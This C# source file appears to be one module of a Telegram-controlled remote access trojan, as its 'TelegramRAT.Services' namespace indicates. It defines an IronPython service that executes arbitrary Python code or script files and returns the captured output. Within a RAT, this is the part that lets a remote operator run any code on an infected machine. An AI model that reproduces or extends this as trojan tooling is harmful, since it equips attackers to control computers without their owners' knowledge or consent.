using Microsoft.Scripting.Hosting;
using IronPython.Hosting;
using System.Text;

namespace TelegramRAT.Services;

public interface IPythonService
{
    void Execute(string code, out string output);
    Task<string> ExecuteFileAsync(string filePath);
    void ClearScope();
}

public class PythonService : IPythonService
{
    private readonly ScriptEngine _engine;
    private ScriptScope _scope;

    public PythonService()
    {
        _engine = Python.CreateEngine();
        _scope = _engine.CreateScope();
    }

    public void Execute(string code, out string output)
    {
        using var pyStream = new MemoryStream();
        _engine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

        try
        {
            _engine.Execute(code, _scope);
            pyStream.Position = 0;
            using var reader = new StreamReader(pyStream, Encoding.UTF8);
            output = reader.ReadToEnd();
        }
        catch (Exception ex)
        {
            output = $"Python Error: {ex.Message}";
        }
        finally
        {
            _engine.Runtime.IO.SetOutput(Stream.Null, Encoding.UTF8);
        }
    }

    public async Task<string> ExecuteFileAsync(string filePath)
    {
        using var pyStream = new MemoryStream();
        _engine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

        try
        {
            _engine.ExecuteFile(filePath, _scope);
            pyStream.Position = 0;
            using var reader = new StreamReader(pyStream, Encoding.UTF8);
            return await reader.ReadToEndAsync();
        }
        catch (Exception ex)
        {
            return $"Python Error: {ex.Message}";
        }
        finally
        {
            _engine.Runtime.IO.SetOutput(Stream.Null, Encoding.UTF8);
        }
    }

    public void ClearScope()
    {
        _scope = _engine.CreateScope();
    }
}
